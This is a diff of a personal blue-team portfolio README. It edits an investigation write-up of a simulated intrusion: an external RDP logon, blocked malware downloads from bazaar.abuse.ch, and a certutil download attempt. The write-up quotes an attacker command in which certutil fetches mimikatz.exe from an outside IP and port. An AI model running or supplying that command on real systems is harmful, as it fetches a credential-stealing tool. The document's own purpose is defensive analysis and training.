@@ -1,14 +1,13 @@
 # SOC Investigation Lab — Blue Team Portfolio
 
 This is my personal collection of SOC investigation write-ups.
-Each one is a simulated alert I worked through myself — from the 
+Each one is a simulated alert I worked through myself, from the 
 moment the alert fired to the point I closed it. I document 
-everything the way I would in a real job. Not perfect, but honest 
-practice and I'm getting better with every case.
+everything the way I would in a real job. 
 
 ---
 
-## Case 01 — Potential Human-Operated Malicious Activity
+## Potential Human-Operated Malicious Activity
 
 **Date:** March 18, 2026  
 **Severity:** High  
@@ -56,6 +55,7 @@ DeviceLogonEvents
 
 <img width="1000" height="600" alt="image" src="https://github.com/user-attachments/assets/10e48070-cbb2-481e-991f-d54b7a7c03ef" />
 
+
 The results gave me two important data points that I needed to 
 separate carefully.
 
@@ -73,11 +73,12 @@ painted a clearer picture of how the attacker got in:
 
 - **`213.152.187.225`** — external IP, direct RDP source, 
   confirmed in DeviceLogonEvents
-- **`10.159.17.126`** — internal IP, remote session initiator 
-  shown in process events — likely a compromised pivot machine
+- I observed the IP using OSINT tool (VirusTotal) and found IP was reported as phishing
 
-Both needed to be treated as IOCs and `10.159.17.126` needed 
-its own investigation.
+<img width="800" height="442" alt="image" src="https://github.com/user-attachments/assets/01d3fb61-1bd2-4079-ab5a-b4702d93fe92" />
+
+
+
 
 ---
 
@@ -91,6 +92,7 @@ attempt. Here's how it went.
 
 **Stage 1 — First download attempt (9:43 PM)**
 
+
 The attacker downloaded a ZIP file from `bazaar.abuse.ch` — a 
 known malware repository. The filename was literally the file's 
 own hash, which is something you see when people pull samples 
@@ -103,10 +105,13 @@ folder and Defender caught it almost immediately.
 - Threat: `Trojan:Script/Wacatac.H!ml`
 - The Mark of the Web flag was set — confirmed it came from the internet
 
+
 Defender flagged and prevented it at 9:45 PM. First attempt — blocked.
 
 <img width="776" height="118" alt="image" src="https://github.com/user-attachments/assets/3f590292-828b-4f27-907c-f109bbb4bd9d" />
 
+
+**Detection Source - EDR**
 ---
 
 **Stage 2 — Second download attempt (9:50 PM)**
@@ -126,7 +131,7 @@ even opening it. Second attempt — blocked again.
 
 <img width="736" height="105" alt="image" src="https://github.com/user-attachments/assets/76ef4925-3717-48c7-88cd-2da03cd2c87e" />
 
-
+**Detection Source - Antivirus**
 ---
 
 **Stage 3 — Going manual (10:03 PM) RCE Techniques**
@@ -141,9 +146,11 @@ Then they ran this command:
 
 ```
 certutil.exe -urlcache -f http://152.44.44.246:8080/mimikatz.exe it_support.exe
-```
-<img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/8e8b2f1f-aff4-4489-9f04-fb2ec6d021e5" />
+``
 
+---
+<img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/8e8b2f1f-aff4-4489-9f04-fb2ec6d021e5" />
+---
 I want to break this down because it's clever. `certutil.exe` is 
 a legitimate Windows binary used for certificate management. 
 Attackers abuse it to download files from the internet because 
@@ -163,6 +170,8 @@ at 10:04 PM. Third attempt — blocked.
 
 <img width="1011" height="119" alt="image" src="https://github.com/user-attachments/assets/187100f9-2c0d-4ae3-9d91-458ea71ae4bf" />
 
+
+**Detection Source - EDR**
 ---
 
 ### Full timeline
@@ -223,7 +232,10 @@ investigation as a potentially compromised internal machine.
 
 <img width="1000" height="500" alt="image" src="https://github.com/user-attachments/assets/8332fa12-d517-428c-b997-f468030a7399" />
 
+---
 
+<img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/47c00303-e5b8-45af-98d9-27605739e325" />
+---
 **Eradication**
 
 I ran a full AV scan on the device, came back clean. Then I went 
@@ -233,7 +245,7 @@ had done anything before Defender caught it, and to look for any
 persistence mechanisms — scheduled tasks, registry run keys, 
 startup folder changes. Found nothing.
 
-<img width="1073" height="496" alt="image" src="https://github.com/user-attachments/assets/d5ca758a-ad26-4d88-9590-165014b2e8f1" />
+<img width="800" height="496" alt="image" src="https://github.com/user-attachments/assets/d5ca758a-ad26-4d88-9590-165014b2e8f1" />
 
 **Recovery**
 
